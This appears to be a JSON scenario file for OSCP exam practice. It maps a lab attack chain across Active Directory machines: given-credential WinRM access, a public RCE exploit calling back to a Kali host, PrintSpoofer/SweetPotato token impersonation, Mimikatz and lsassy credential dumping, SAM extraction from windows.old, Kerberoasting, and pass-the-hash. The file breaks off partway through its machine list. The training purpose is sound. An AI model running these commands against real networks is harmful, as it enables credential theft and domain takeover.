{
  "id": "credential-relay-chain",
  "title": "Credential Relay Chain",
  "category": "exam-format",
  "source": ["OSCP A (Challenge Lab 4)"],
  "designed_by": "lab-derived",
  "description": "Exam-format scenario: 3 AD machines + 3 standalone. Given creds on AD entry → token impersonation → lsassy credential dump → PtH pivot → windows.old SAM extraction → Domain Admin. Standalone boxes test public CVE exploitation on unusual ports.",
  "introduction": "Teaches the core OSCP AD chain: given creds → token impersonation → credential harvest → Pass-the-Hash pivot. Critical for exam time management: one foothold can unlock the entire domain.",
  "mental_model": "Think of each machine as a credential vending machine: dump creds, spray/PtH to next hop, repeat. Prioritize lsassy/Mimikatz early; windows.old SAM is your backup path when LSASS fails.",
  "key_principles": [
    "Check SeImpersonate first—PrintSpoofer/SweetPotato are instant SYSTEM",
    "Dump creds before pivoting; NTLM hashes enable PtH without cracking",
    "windows.old SAM/SYSTEM survives when LSASS protections block dumps",
    "Ligolo-ng tunnels let you reach internal hosts from dual-NIC entry",
    "Standalone boxes: enumerate unusual ports, searchsploit before rabbit holes"
  ],

  "indicators": {
    "difficulty": 5,
    "cognitive_load": 4,
    "enumeration_depth": 3,
    "rabbit_hole_risk": 3,
    "time_pressure": 5
  },

  "mitre": {
    "tactics": ["TA0001","TA0003","TA0004","TA0006","TA0007","TA0008"],
    "techniques": [
      {"id":"T1021.006","name":"Windows Remote Management"},
      {"id":"T1134.001","name":"Token Impersonation/Theft"},
      {"id":"T1003.001","name":"LSASS Memory"},
      {"id":"T1003.002","name":"Security Account Manager"},
      {"id":"T1550.002","name":"Pass the Hash"},
      {"id":"T1190","name":"Exploit Public-Facing Application"},
      {"id":"T1572","name":"Protocol Tunneling"},
      {"id":"T1053.005","name":"Scheduled Task/Cron"},
      {"id":"T1552.001","name":"Credentials In Files"}
    ]
  },

  "kill_chain_phases": ["T1-Recon","T2-Web-Access","T3-NonWeb-Access","T4a-Linux-PrivEsc","T4b-Win-PrivEsc","T5-Credentials","T6-Pivoting","T7-Lateral"],

  "environment": {
    "machine_count": 6,
    "network_count": 2,
    "os_distribution": {"windows": 4, "linux": 2},
    "has_ad": true,
    "has_pivoting": true,
    "has_client_side": false
  },

  "technique_tags": [
    "evil-winrm","printspoofer","sweetpotato","lsassy","mimikatz","ligolo-ng","iox",
    "pass-the-hash","kerberoasting","windows.old","SAM","SYSTEM","SeImpersonate",
    "nmap","feroxbuster","snmpwalk","CVE-2020-13151","aerospike","wifi-mouse",
    "EDB-49601","EDB-50801","EDB-50972","zip2john","joomla","git-dumper","pspy",
    "cron","putty-registry","rdp","ssh","nxc","hashcat","impacket-secretsdump",
    "pypykatz","creddump7","bloodhound"
  ],

  "exam_relevance": {
    "oscp_exam_format": true,
    "pen200_modules": [6,8,13,16,17,18,19,24],
    "pattern_frequency": "high",
    "recommended_order": 3
  },

  "prerequisites": [],
  "builds_on": ["assume-breach-config-chain"],

  "networks": [
    {"id":"external","cidr":"192.168.x.0/24","label":"Standalone / External"},
    {"id":"internal","cidr":"10.10.x.0/24","label":"AD Internal"}
  ],

  "machines": [
    {
      "id":"ms01",
      "label":"MS01",
      "ip":"192.168.x.141",
      "os":"Windows",
      "role":"AD Entry (dual-NIC)",
      "networks":["external","internal"],
      "services":[
        {
          "port":5985,"name":"WinRM","version":"",
          "vulnerabilities":[
            {"type":"given-creds","summary":"Evil-WinRM with Eric.Wallows creds","leads_to":"local-user"}
          ],
          "commands":[{"cmd": "evil-winrm -i 192.168.x.141 -u Eric.Wallows -p 'EricLikesRunning800'", "rationale": "Why: Use given creds to get shell and start credential harvest"}]
        },
        {
          "port":81,"name":"Attendance & Payroll System","version":"1.0",
          "vulnerabilities":[
            {"type":"rce","cve":"EDB-50801","summary":"Unauthenticated RCE","leads_to":"local-user"}
          ],
          "commands":["python3 50801.py http://192.168.x.141:81/ 192.168.x.KALI 443"]
        }
      ],
      "privesc":[
        {
          "from":"Eric.Wallows / mary.williams",
          "to":"SYSTEM",
          "technique":"SeImpersonate → PrintSpoofer / SweetPotato",
          "commands":[
            "whoami /priv",
            {"cmd": "PrintSpoofer64.exe -i -c cmd", "rationale": "Why: Abuse SeImpersonate to become SYSTEM and dump LSASS"},
            "SweetPotato.exe -e EfsRpc -p C:\\tmp\\rev.exe"
          ]
        }
      ],
      "credentials":[
        {"user":"celia.almeda","type":"ntlm-hash","source":"nxc lsassy / mimikatz","unlocks":["ms02"]},
        {"user":"Mary.Williams","type":"ntlm-hash","source":"lsassy","unlocks":[]}
      ],
      "alternatives":[
        {"source":"A3/A4","description":"Port 81 Attendance & Payroll RCE (EDB-50801) as alternative entry — no given creds needed"},
        {"source":"A5","description":"SweetPotato instead of PrintSpoofer for token impersonation"},
        {"source":"A3","description":"Kerberoasting from MS01: sql_svc has SPN (hash uncracked)","commands":["impacket-GetUserSPNs oscp.exam/Eric.Wallows -dc-ip 10.10.x.140 -request"]}
      ]
    },
    {
      "id":"ms02",
      "label":"MS02",
      "ip":"10.10.x.142",
      "os":"Windows",
      "role":"AD Member",
      "networks":["internal"],
      "services":[
        {
          "port":5985,"name":"WinRM","version":"",
          "vulnerabilities":[
            {"type":"pth","summary":"Evil-WinRM with celia.almeda NTLM hash","leads_to":"local-user"}
          ],
          "commands":[{"cmd": "evil-winrm -i 10.10.x.142 -u celia.almeda -H '<ntlm_hash>'", "rationale": "Why: PtH bypasses password; pivot to internal via tunnel"}]
        }
      ],
      "privesc":[
        {
          "from":"celia.almeda",
          "to":"tom_admin (hash)",
          "technique":"windows.old SAM/SYSTEM dump → offline hash extraction",
          "commands":[
            "cd C:\\windows.old\\Windows\\System32\\config",
            "download SAM",
            "download SYSTEM",
            {"cmd": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL", "rationale": "Why: Extract NTLM hashes offline when LSASS dump fails"},
            "pypykatz registry --sam SAM --system SYSTEM"
          ]
        }
      ],
      "credentials":[
        {"user":"tom_admin","type":"ntlm-hash","source":"windows.old SAM dump","unlocks":["dc01"]},
        {"user":"Domain Admin","type":"ntlm-hash","source":"Mimikatz on MS02 (A3)","unlocks":["dc01"]}
      ],
      "alternatives":[
        {"source":"A3","description":"Mimikatz sekurlsa::logonpasswords on MS02 extracts DA NTLM hash directly","commands":["mimikatz.exe","privilege::debug","sekurlsa::logonpasswords"]},
        {"source":"A3/A4","description":"pypykatz or creddump7 for offline SAM parsing instead of impacket-secretsdump"}
      ]
    },
    {
